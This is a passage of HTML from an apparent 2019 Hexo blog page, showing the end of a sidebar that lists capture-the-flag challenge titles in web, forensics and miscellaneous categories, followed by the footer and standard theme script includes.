class="nav-number">1.5.</span> <span class="nav-text">Web_Request Me</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Moar-Horses"><span class="nav-number">1.6.</span> <span class="nav-text">Web_Moar Horses</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Ess-Kyoo-Ell"><span class="nav-number">1.7.</span> <span class="nav-text">Web_Ess Kyoo Ell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Stupid-blog"><span class="nav-number">1.8.</span> <span class="nav-text">Web_Stupid blog</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Forensics"><span class="nav-number">2.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Weird-Logo"><span class="nav-number">2.1.</span> <span class="nav-text">Forensics_Weird Logo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Lexington-State-Bank"><span class="nav-number">2.2.</span> <span class="nav-text">Forensics_Lexington State Bank</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Grid-Parser"><span class="nav-number">2.3.</span> <span class="nav-text">Forensics_Grid Parser</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Weird-Audio-Circuit"><span class="nav-number">2.4.</span> <span class="nav-text">Forensics_Weird Audio Circuit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Ssleepy"><span class="nav-number">2.5.</span> <span class="nav-text">Forensics_Ssleepy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-We-Will-Rock-You"><span class="nav-number">2.6.</span> <span class="nav-text">Forensics_We Will Rock You</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Moar-Turtles"><span class="nav-number">2.7.</span> <span class="nav-text">Forensics_Moar Turtles</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Forensics-Volatile-Virus"><span class="nav-number">2.8.</span> <span class="nav-text">Forensics_Volatile Virus</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Miscellaneous"><span class="nav-number">3.</span> <span class="nav-text">Miscellaneous</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Trippy"><span class="nav-number">3.1.</span> <span class="nav-text">Miscellaneous_Trippy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Discord"><span class="nav-number">3.2.</span> <span class="nav-text">Miscellaneous_Discord!</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Interference"><span class="nav-number">3.3.</span> <span class="nav-text">Miscellaneous_Interference</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Nothing-but-Everything"><span class="nav-number">3.4.</span> <span class="nav-text">Miscellaneous_Nothing but Everything</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Huuuuuge"><span class="nav-number">3.5.</span> <span class="nav-text">Miscellaneous_Huuuuuge</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Learn-My-Flag"><span class="nav-number">3.6.</span> <span class="nav-text">Miscellaneous_Learn My Flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Miscellaneous-Mirror-Mirror"><span class="nav-number">3.7.</span> <span class="nav-text">Miscellaneous_Mirror Mirror</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jianghuxia</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
